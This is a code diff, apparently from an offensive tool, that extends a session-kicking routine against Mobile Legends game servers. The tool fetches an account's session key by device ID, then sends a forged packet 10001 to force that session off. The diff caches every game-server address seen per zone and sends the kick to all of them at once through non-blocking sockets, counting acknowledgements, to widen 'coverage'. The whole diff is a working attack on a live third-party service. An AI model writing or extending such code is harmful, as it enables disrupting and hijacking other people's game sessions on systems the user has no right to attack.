@@ -17,6 +17,8 @@ and_usa, login.ml.youngjoygame.com:30021.
 The one deliberate change: everything takes a per-device delay from config so
 a run can be paced. The source had none.
 """
+import errno
+import select
 import socket
 import threading
 import time
@@ -296,6 +298,51 @@ def cached_name(device_id=None, acc=None):
     return (None, "")
 
 
+# ── game-server address cache ──────────────────────────────────────────────
+# zone_id -> ordered list of "host:port" seen for that zone.
+#
+# The login server load balances per ACCOUNT: measured here, one account always
+# gets the same address (8/8 logins) while four different accounts got four
+# different addresses. So an account's live session sits on the address the
+# login handed us — but the account may also be reachable on an address seen
+# for another account in the same zone. Remembering every address per zone and
+# kicking all of them is what widens coverage.
+_GS_BY_ZONE = {}
+_GS_MAX_PER_ZONE = 64
+_GS_LOCK = threading.Lock()
+
+# ACKs from the most recent kick_many() call, so the caller can report
+# "ACK x2/3" instead of a bare "sent".
+_LAST_ACKS = [0]
+_LAST_SENT = [0]
+
+
+def remember_game_server(zone_id, gs_info):
+    """Record a game-server address for this zone (newest first)."""
+    if not gs_info or ":" not in str(gs_info):
+        return
+    with _GS_LOCK:
+        lst = _GS_BY_ZONE.setdefault(zone_id, [])
+        if gs_info in lst:
+            lst.remove(gs_info)
+        lst.insert(0, gs_info)
+        del lst[_GS_MAX_PER_ZONE:]
+
+
+def known_game_servers(zone_id):
+    with _GS_LOCK:
+        return list(_GS_BY_ZONE.get(zone_id, []))
+
+
+def seed_game_servers(zone_id, addresses):
+    for a in addresses:
+        remember_game_server(zone_id, a.strip())
+
+
+def last_ack_counts():
+    return _LAST_SENT[0], _LAST_ACKS[0]
+
+
 class ProfileError(Exception):
     def __init__(self, reason, detail="", retryable=False):
         super().__init__(reason)
@@ -365,6 +412,9 @@ def fetch_profile(device_id, attempts=None):
                             break
 
             g.bancheck()
+            # Remember this zone's address so later kicks can fan out to
+            # everything known for it.
+            remember_game_server(g.zid, f"{g.gh}:{g.gp}")
             return {
                 "device_id": device_id,
                 "acc": g.acc, "skey": g.skey, "zid": g.zid,
@@ -380,74 +430,167 @@ def fetch_profile(device_id, attempts=None):
     raise last or ProfileError("tidak bisa ambil profil", retryable=True)
 
 
-def kick(profile, timeout=None):
-    """Source: Brute.kick(profile).
+def _kick_frame(profile):
+    body = SdpStruct({
+        0: profile["acc"], 1: profile["skey"], 2: profile["zid"],
+        4: cfg.VER, 13: cfg.CHAN, 15: profile["device_id"],
+    }).data
+    pkt = SdpStruct({0: 10001, 1: 1, 5: body}).data
+    comp = zstd.compress(pkt)
+    return ((len(comp) + 4) | (16 << 24)).to_bytes(4, "big") + comp
 
-    Send packet 10001 to the profile's game server, then read the reply.
-    Socket timeout is 4.5s (the source's value).
+
+def _kick_many(servers, frame, connect_timeout, ack_wait):
+    """Send the kick to many game servers from a SINGLE thread.
+
+    One thread per server does not scale (threads = workers x servers), so the
+    non-blocking connects and the ACK reads are fanned out with select() and
+    the thread count stays one per kick. Ported from Sumire.
+
+    Returns {gs: (sent, acked)}.
+    """
+    out = {}
+    socks = {}
+    for gs in servers:
+        host, _, port = gs.partition(":")
+        s = None
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setblocking(False)
+            try:
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            except Exception:
+                pass
+            rc = s.connect_ex((host, int(port)))
+            if rc not in (0, errno.EINPROGRESS, errno.EWOULDBLOCK, errno.EALREADY):
+                out[gs] = (False, False)
+                s.close()
+                continue
+            socks[gs] = s
+            out[gs] = (False, False)
+        except Exception:
+            out[gs] = (False, False)
+            if s:
+                try:
+                    s.close()
+                except Exception:
+                    pass
+    if not socks:
+        return out
+
+    # phase 1: wait for every connect to finish, then send
+    pending = dict(socks)
+    deadline = time.time() + connect_timeout
+    sent_at = {}
+    while pending and time.time() < deadline:
+        wl = list(pending.values())
+        try:
+            _, writable, exceptional = select.select([], wl, wl,
+                                                     max(0, deadline - time.time()))
+        except Exception:
+            break
+        for s in writable + exceptional:
+            gs = next((g for g, so in pending.items() if so is s), None)
+            if gs is None:
+                continue
+            pending.pop(gs, None)
+            try:
+                if s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR) != 0:
+                    continue
+                s.setblocking(True)
+                s.settimeout(max(0.05, deadline - time.time()))
+                s.sendall(frame)
+                s.setblocking(False)
+                out[gs] = (True, False)
+                sent_at[gs] = time.time()
+            except Exception:
+                pass
+
+    # phase 2: read the ACKs (packet 10002)
+    if ack_wait and sent_at:
+        want = {gs: s for gs, s in socks.items() if out.get(gs, (False,))[0]}
+        bufs = {gs: b"" for gs in want}
+        ack_deadline = max(sent_at.values()) + ack_wait
+        while want and time.time() < ack_deadline:
+            rl = list(want.values())
+            try:
+                readable, _, _ = select.select(rl, [], [],
+                                               max(0, ack_deadline - time.time()))
+            except Exception:
+                break
+            for s in readable:
+                gs = next((g for g, so in want.items() if so is s), None)
+                if gs is None:
+                    continue
+                try:
+                    d = s.recv(4096)
+                except Exception:
+                    d = b""
+                if not d:
+                    want.pop(gs, None)
+                    continue
+                bufs[gs] += d
+                if len(bufs[gs]) >= 4:
+                    sz = int.from_bytes(bufs[gs][:4], "big") & 0xFFFFFF
+                    if len(bufs[gs]) >= sz:
+                        payload = bufs[gs][4:sz]
+                        try:
+                            payload = zstd.decompress(payload)
+                        except Exception:
+                            pass
+                        if SdpStruct(payload).get(0) == 10002:
+                            out[gs] = (out[gs][0], True)
+                        want.pop(gs, None)
+
+    for s in socks.values():
+        try:
+            s.close()
+        except Exception:
+            pass
+    return out
+
+
+def kick(profile, timeout=None, servers=None):
+    """Kick the session, fanning out to every known game server for the zone.
+
+    Coverage matters: the login server load balances per account, so the
+    address we were handed is the one the session sits on — but the account may
+    also be reachable on an address learned from another account in the same
+    zone. All of them are kicked at once (same wall time as kicking one, since
+    the connects overlap) from a single thread.
 
     Returns (ok, elapsed_ms, description).
     """
     timeout = timeout or cfg.KICK_TIMEOUT
     t0 = time.time()
-    s = None
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(timeout)
-        try:
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        except Exception:
-            pass
-        s.connect((profile["gh"], int(profile["gp"])))
 
-        body = SdpStruct({
-            0: profile["acc"], 1: profile["skey"], 2: profile["zid"],
-            4: cfg.VER, 13: cfg.CHAN, 15: profile["device_id"],
-        }).data
-        pkt = SdpStruct({0: 10001, 1: 1, 5: body}).data
-        comp = zstd.compress(pkt)
-        s.send(((len(comp) + 4) | (16 << 24)).to_bytes(4, "big") + comp)
+    if servers is None:
+        servers = known_game_servers(profile.get("zid"))
+        own = f"{profile.get('gh')}:{profile.get('gp')}"
+        if own and own not in servers:
+            servers = [own] + servers
+    servers = list(dict.fromkeys(s for s in servers if s and ":" in s))
+    if not servers:
+        return False, 0.0, "no game server known"
+    if not cfg.BF_KICK_ALL_SERVERS:
+        servers = servers[:1]
 
-        # read the reply (the source reads it; we also report whether the ACK
-        # (packet 10002) actually arrived, instead of calling any byte success)
-        q = b""
-        got_ack = False
-        try:
-            while len(q) < 4:
-                d = s.recv(4096)
-                if not d:
-                    break
-                q += d
-            if len(q) >= 4:
-                fl = int.from_bytes(q[:4], "big")
-                sz = fl & 0xFFFFFF
-                while len(q) < sz:
-                    d = s.recv(4096)
-                    if not d:
-                        break
-                    q += d
-                if len(q) >= sz:
-                    payload = q[4:sz]
-                    try:
-                        payload = zstd.decompress(payload)
-                    except Exception:
-                        pass
-                    got_ack = SdpStruct(payload).get(0) == 10002
-        except socket.timeout:
-            pass
+    frame = _kick_frame(profile)
+    results = _kick_many(servers, frame, timeout, cfg.BF_ACK_WAIT)
+    sent = sum(1 for v in results.values() if v[0])
+    acked = sum(1 for v in results.values() if v[1])
+    _LAST_SENT[0] = sent
+    _LAST_ACKS[0] = acked
+    ms = (time.time() - t0) * 1000
 
-        ms = (time.time() - t0) * 1000
-        return True, ms, ("ACK RECEIVED" if got_ack else "SENT OK")
-    except socket.timeout:
-        return False, (time.time() - t0) * 1000, "TIMEOUT"
-    except Exception as e:
-        return False, (time.time() - t0) * 1000, f"{type(e).__name__}"
-    finally:
-        if s:
-            try:
-                s.close()
-            except Exception:
-                pass
+    if sent == 0:
+        return False, ms, "GAME SERVER REFUSED"
+    if len(servers) == 1:
+        desc = "ACK RECEIVED" if acked else "SENT (no ack)"
+    else:
+        desc = (f"ACK ×{acked}/{len(servers)} server" if acked
+                else f"SENT ×{sent}/{len(servers)} server")
+    return True, ms, desc
 
 
 def kick_once(device_id, want_lookup=True):
@@ -458,6 +601,8 @@ def kick_once(device_id, want_lookup=True):
         return False, f"❌ {e.reason}", None
     if not want_lookup:
         profile["nick"] = ""
+    if cfg.MLBB_GS_SEED:
+        seed_game_servers(profile.get("zid"), cfg.MLBB_GS_SEED)
     ok, ms, desc = kick(profile)
     who = f"{profile['acc']} · {profile['nick']}" if profile.get("nick") else str(profile["acc"])
     if not ok:
